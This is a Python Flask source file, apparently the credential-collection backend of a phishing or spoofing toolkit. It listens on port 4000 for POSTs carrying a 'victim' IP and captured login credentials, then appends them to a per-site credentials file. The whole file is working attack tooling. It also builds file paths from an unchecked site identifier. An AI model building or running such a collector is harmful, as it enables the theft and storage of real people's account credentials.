from flask import Flask, request
import os
import ast
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *

# Creating Flask app
app = Flask(__name__)

#
# Function for adding catched credentials to credfile
# 
def add_credentials_to_file(credentials, file_path, ip_victim):

    # Create a dict from parameter credentials
    dict_obj = ast.literal_eval(credentials)

    try:

        # Format line
        formatted_line = ip_victim + " --- " + "; ".join([f"{key}='{value}'" for key, value in dict_obj.items()]) + ";\n"

        # Open file and paste new line
        with open(file_path, mode='a', encoding='utf-8') as file:
            file.write(formatted_line)

        # Return a success HTTP response
        return {"message": "Data successfully added"}, 200
    
    except Exception as e:
        print(e);
        return {"message": f"An error occurred: {str(e)}"}, 500

#
# Handler
#
@app.route('/', methods=['POST'])
def handle_request():

    # Only treat POST requests
    if request.method == 'POST':

        # Check if request is JSON
        if request.is_json:
            data = request.get_json()
            site_id = data.get('site_id')
            credentials = data.get('credentials')
            ip_victim = data.get('ip_victim')
        else:
            site_id = request.form.get('site_id')
            credentials = request.form.get('credentials')
            ip_victim = request.form.get('ip_victim')

        # Check if site_id, victim_id and credentials are submitted
        if not site_id or not credentials or not ip_victim:
            return {"error": "Missing site_id or credentials"}, 400

        # Evaluate (new) file path and call the add function
        file_path = os.path.join(ENV['nspoof_location'] + "/credentials", f"{site_id}")
        add_credentials_to_file(credentials, file_path, ip_victim);

        # Return a success response
        return {"message": "Data successfully added"}, 200

    # By default return an invalid response
    return {"error": "Invalid request method"}, 405

# Launch server
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=4000, threaded=True)